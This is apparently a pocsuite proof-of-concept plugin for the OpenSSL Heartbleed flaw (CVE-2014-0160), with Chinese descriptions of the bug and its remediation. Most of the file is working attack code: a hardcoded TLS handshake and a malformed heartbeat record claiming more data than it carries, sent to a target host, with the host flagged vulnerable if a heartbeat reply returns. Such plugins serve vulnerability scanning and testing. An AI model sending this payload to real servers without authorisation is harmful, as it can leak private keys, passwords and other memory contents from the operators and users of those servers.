#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
from pocsuite.thirdparty.guanxing import parse_ip_port
import struct
import socket
import time
import select

socket.setdefaulttimeout(5)

def request2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')


client_key_exchange = request2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')


malformed_heartbeat = request2bin('''
18 03 02 00 03
01 40 00
''')


def get_msg_from_socket(some_socket, msg_length, time_out=5):

	end_time = time.time() + time_out

	received_data = ''

	remaining_msg = msg_length

	while remaining_msg > 0:

		read_time = end_time - time.time()

		if read_time < 0:
			return None
		read_socket, write_socket, error_socket = select.select([some_socket], [], [], time_out)

		if some_socket in read_socket:

			data = some_socket.recv(remaining_msg)

			if not data:
				return None

			else:
				received_data += data
				remaining_msg -= len(data)

		else:
			pass

	return received_data
		

def recv_msg(a_socket):

	header = get_msg_from_socket(a_socket, 5)

	if header is None:
		return None, None, None

	message_type, message_version, message_length = struct.unpack('>BHH', header)
	message_payload = get_msg_from_socket(a_socket, message_length, 10)

	if message_payload is None:
		return None, None, None

	return message_type, message_version, message_payload


def send_n_catch_heartbeat(our_socket):

	our_socket.send(malformed_heartbeat)

	while True:

		content_type, content_version, content_payload = recv_msg(our_socket)

		if content_type is None:
			return False

		if content_type == 24:
			return True

		if content_type == 21:
			return False

def main(rhost):
	global port
	ip,port = parse_ip_port(rhost)
	# 预定义默认端口
	if not port :
		port = 443

	local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	local_socket.connect((ip, int(port)))
	local_socket.send(client_key_exchange)

	while True:
		type, version, payload = recv_msg(local_socket)
		if not type:
			return
		if type == 22 and ord(payload[0]) == 0x0E:
			break

	local_socket.send(malformed_heartbeat)
	return send_n_catch_heartbeat(local_socket)


class TestPOC(POCBase):
	vulID = 'DSO-00046'
	version = ''
	author = 'ly'
	vulDate = '2014-04-08'
	createDate = '2020-03-09'
	updateDate = '2020-03-13'
	references = ['https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E']
	name = 'Openssl 1.0.1 内存读取 信息泄露漏洞'
	appPowerLink = ''
	appName = 'OpenSSL'
	appVersion = '1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1'
	vulType = 'info-disclosure'
	# 漏洞描述
	desc = '''
即“心脏出血漏洞”，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，从而获取用户信息。
	'''
	# the sample sites for examine
	samples = ['']
	install_requires = ['']
	cveID = 'CVE-2014-0160'
	severity = 'high'
	solution = '''
为了解决此漏洞，除了需要安装修复后的软件（OpenSSL动态库及静态使用OpenSSL的二进制文件）之外，还可能要做其他的事。运行中的、依赖于OpenSSL的应用程序仍会使用在内存中的有缺陷OpenSSL代码，直至重新启动，才能堵住漏洞。
此外，即使漏洞本身已经修复，因漏洞受到攻击的系统在保密性、甚至完整性上仍存隐患。为了重新获得保密性和可信度，服务器必须重新生成所有受损的私钥-公钥对，并撤销及替换与之相关的所有证书。一般来说，必须更换所有受到影响的认证资料（例如密码），因为难以确认受漏洞影响的系统是否已被攻击。
	'''
	taskType = 'app-vul'
	
	def _verify(self):
		# print self.url
		response = main(self.url)
		# print response
		return self.parse_attack(response)

	def _attack(self):
		return self._verify()

	def parse_attack(self, response):
		output = Output(self)
		result = {}

		if response:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = '%s' % self.url
			result['VerifyInfo']['port'] = port
			output.success(result)
		else:
			output.fail('Failed')

		return output


register(TestPOC)